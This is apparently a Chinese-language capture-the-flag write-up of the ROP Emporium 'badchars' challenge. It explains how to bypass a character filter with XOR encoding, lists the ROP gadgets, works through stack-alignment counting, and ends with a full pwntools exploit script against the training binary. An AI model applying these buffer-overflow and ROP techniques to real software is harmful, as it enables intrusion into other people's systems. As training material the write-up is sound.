# badchars

> ROP Emporium 第 5 题 | x86-64 Linux | 知识点: 字符过滤绕过 + XOR 编码 + 四连 pop + 栈对齐高级算法

## 题目简介

write4 的进阶版:

- 同样的栈溢出 + `print_file("flag.txt")` 目标
- **但 pwnme 里有过滤循环**,把 payload 中的 `'x'` / `'g'` / `'a'` / `'.'` 4 个字符替换成 `0xEB`
- 直接写 `"flag.txt"` 会被破坏成 `"fl\xebb\xeb...t"`

需要用 XOR 编码绕过过滤:**在 payload 里写编码后的字符串(不含 badchars),写进 .bss 后再用 XOR gadget 逐字节解码回 `"flag.txt"`**。

## 核心知识点

- **字符过滤机制**: pwnme 里逐字节扫 payload,撞上 badchars 之一就替换成 `0xEB`(机器码层面破坏)
- **XOR 编码绕过**: 选一个 key `K`,把 `"flag.txt"` 每字节 `^K` 得到编码字符串(必须保证编码后也不含 badchars)。写入内存后用 `xor` gadget 再 `^K` 解回原文
- **四连 pop gadget**: `pop r12; pop r13; pop r14; pop r15; ret` 一次喂饱 4 个寄存器,出题人故意设计的"组合优惠包"
- **逐字节 XOR 解码**: `xor byte ptr [r15], r14b; ret` 一次只能改 **1 字节**,8 字节字符串要循环 8 次
- **重叠 gadget**: `pop r15` 机器码 `41 5f`,偏移 1 字节取 `5f` 单独解析就是 `pop rdi`(同一段字节用不同起点解析出不同指令)
- **栈对齐通用算法**(本题修正之前的规律): 数所有 `+8` 操作总数 N(每个 pop 和每个 gadget 的 ret 都算),奇数对齐,偶数需要补 ret_gadget

## 二进制侦察

```bash
file ./badchars
checksec --file=badchars

ROPgadget --binary ./badchars | grep -E "mov qword|xor byte|pop r12"
```

关键 gadget:

```
0x40069c : pop r12; pop r13; pop r14; pop r15; ret    (四连 pop)
0x400634 : mov qword ptr [r13], r12; ret              (write-what-where)
0x400628 : xor byte ptr [r15], r14b; ret              (逐字节 XOR)
0x4006a0 : pop r14; pop r15; ret                      (循环用)
0x4006a3 : pop rdi; ret                               (重叠 gadget, pwntools 自动找)
```

## 漏洞分析

pwnme 关键代码(Ghidra 反编译):

```c
void pwnme(void) {
    char buffer[32];
    ulong len, i, j;

    memset(buffer, 0, 32);
    len = read(0, buffer, 0x200);

    for (i = 0; i < len; i++) {
        for (j = 0; j < 4; j++) {
            if (buffer[i] == "xga."[j]) {     // 撞 badchars
                buffer[i] = -0x15;            // 替换成 0xEB
            }
        }
    }
}
```

被禁字符: `'x'`, `'g'`, `'a'`, `'.'`。`"flag.txt"` 包含 `'g'`、`'a'`、`'.'`,直接写废了。

## 攻击思路

### XOR 编码

选 `key = 0x02`(任意,只要编码后不含 badchars):

```
"flag.txt" 原始:  f    l    a    g    .    t    x    t
                 0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74

XOR 0x02 后:     0x64 0x6e 0x63 0x65 0x2c 0x76 0x7a 0x76
                 'd'  'n'  'c'  'e'  ','  'v'  'z'  'v'
```

`"dnce,vzv"` 不含 `x` / `g` / `a` / `.`,过滤循环放它过。

### ROP 链分层

```
阶段 1: 写编码字符串到 .bss + 解码第 0 字节
    pop r12/r13/r14/r15  → R12="dnce,vzv", R13=.bss, R14=0x02, R15=.bss+0
    mov [r13], r12       → [0x601038] = "dnce,vzv"
    xor [r15], r14b      → [0x601038] ^= 0x02 = 'f'  (第 0 字节解完)

阶段 2: 解码剩下 7 个字节 (循环 7 轮)
    for i in 1..7:
        pop r14/r15      → R14=0x02 (重设), R15=.bss+i
        xor [r15], r14b  → [.bss+i] ^= 0x02

阶段 3: 调用 print_file
    pop rdi              → RDI = .bss
    print_file@plt       → 输出 flag
```

### 栈对齐验证

按"数所有 +8 操作"算法:

```
pop_all        : 4 pop + 1 ret = 5
mov gadget     : 0 pop + 1 ret = 1
xor gadget     : 0 pop + 1 ret = 1
7 轮 × (pop_r14_r15 + xor)
               : 7 × (2 pop + 1 ret + 1 ret) = 28
pop_rdi        : 1 pop + 1 ret = 2

总 N = 5 + 1 + 1 + 28 + 2 = 37 (奇数)
→ 进 print_file 时 RSP 末位 = 8, 对齐 ✓
→ 不需要 ret_gadget
```

## exploit

完整代码见 [exploit.py](./exploit.py)。

```python
from pwn import *

elf = ELF('./badchars')
io = process('./badchars')

pop_all     = 0x40069c
mov_r13_r12 = 0x400634
xor_r15     = 0x400628
pop_r14_r15 = 0x4006a0

rop = ROP(elf)
pop_rdi    = rop.find_gadget(['pop rdi', 'ret']).address
bss        = elf.bss()
print_file = elf.plt['print_file']

key = 0x02
encoded = bytes([b ^ key for b in b'flag.txt'])

payload = b'A' * 40
payload += p64(pop_all)
payload += p64(u64(encoded))
payload += p64(bss)
payload += p64(key)
payload += p64(bss)
payload += p64(mov_r13_r12)
payload += p64(xor_r15)

for i in range(1, 8):
    payload += p64(pop_r14_r15)
    payload += p64(key)
    payload += p64(bss + i)
    payload += p64(xor_r15)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(print_file)

io.sendline(payload)
io.interactive()
```

## 关键细节

- **key 选择策略**: key 必须保证编码后字符串里也不含 badchars。`0x02` 在本题刚好可用,但其他题可能不行。**通用方法**: 写脚本暴力枚举 `key` 从 1 到 255,过滤掉编码后含 badchars 的
- **重叠 gadget**: `pop rdi` 没有显式的 `pop rdi; ret`(机器码 `5f c3`),但程序里 `pop r15` (`41 5f`) 后跟 ret (`c3`),从 `5f` 字节起算就是 `pop rdi; ret`。pwntools `find_gadget` 自动找到。**字节流可以从任意位置反汇编是 x86 变长指令的天然特性**
- **不要凭直觉加 ret_gadget**: 这题的 N=37 是奇数,加 ret_gadget 反而拉到偶数 = 不对齐 = movaps 崩 = EOF。**调试时用对齐算法验证,不要瞎加**

## 教训(本题踩过的坑)

1. **mov 地址 typo**(`0x4000634` vs `0x400634`)—— 跳到非法地址立即崩,Thank you! 输出但 ROP 链中段 EOF
2. **多加了 ret_gadget**—— 对齐错位,print_file 内 movaps 崩,Thank you! + EOF
3. **错算 padding** —— Ghidra `acStack_28` 的 0x28 直接是 padding (40),**不是 0x28 + 8 = 48**。基准是函数入口 RSP,不是 saved RBP

## Flag

```
ROPE{a_placeholder_32byte_flag!}
```

## 参考

- ROP Emporium: <https://ropemporium.com/challenge/badchars.html>
